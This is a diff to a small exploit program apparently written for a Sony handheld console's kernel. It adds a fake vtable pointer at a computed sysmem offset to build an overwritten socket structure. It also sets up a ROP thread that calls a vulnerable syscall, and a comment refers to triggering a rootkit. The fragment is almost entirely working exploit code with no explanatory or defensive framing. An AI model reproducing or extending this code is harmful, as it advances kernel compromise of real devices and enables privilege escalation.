@@ -30,6 +30,7 @@ data
 	variable pret;
 	buffer ldm_buf[7 * 4];
 	buffer mybuf[0x100];
+	variable vptr;
 }
 
 code : entry
@@ -67,6 +68,12 @@ code : entry
 
 	// trigger rootkit
 	// sceIoClose(0xb00b5);
+
+	// set up overwritten socket structure
+	add([sysmem_base], 0x25eb8); // 0x25ED4 - 28);
+	store(&return, vptr);
+	PRINTF("got offset 0x%x\n", [vptr]);
+	store([vptr], mybuf + 0x18); // vptr
 
 	// create and set up rop thread that will call vulnerable syscall
 	sceKernelCreateThread("mhm", ldm_r1_stuff, 0x10000100, stack_size, 0, 0, 0);
@@ -173,6 +180,10 @@ code : entry
 
 	sceKernelDelayThread(1*1000*1000);
 	PRINTF("user thread reports %d\n", [pret]);
+
+	add([pret], 1052); // => should be zero now
+	add(&return, infloop);  // => crash on fail infloop on success
+	call_r0(0);
 
 	infloop();
 }
